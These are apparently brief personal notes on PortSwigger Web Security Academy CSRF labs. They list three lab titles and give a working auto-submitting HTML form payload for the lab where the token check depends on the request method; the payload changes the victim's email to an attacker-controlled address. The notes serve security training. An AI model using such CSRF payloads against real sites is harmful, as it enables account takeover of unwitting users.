# [1. Lab: CSRF vulnerability with no defenses](https://portswigger.net/web-security/csrf/lab-no-defenses)

# [2. Lab: CSRF where token validation depends on request method](https://portswigger.net/web-security/csrf/lab-token-validation-depends-on-request-method)

This lab's email change functionality is vulnerable to CSRF. It attempts to block CSRF attacks, but only applies **defenses to certain types of requests**.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: wiener:peter

```js
<form action="https://0a99000404688a6081f44d2f002800b2.web-security-academy.net/my-account/change-email?email=2332%4022&csrf=zYz8BGtIsz8YghTsu3R1RqL2Nee09Rnc" method="GET">
<input type="hidden" name="email" value="attacker2@evil-user.net" /></form>
<script> document.forms[0].submit(); </script>
```

# [3. Lab: CSRF where token validation depends on token being present](https://portswigger.net/web-security/csrf/lab-token-validation-depends-on-token-being-present)
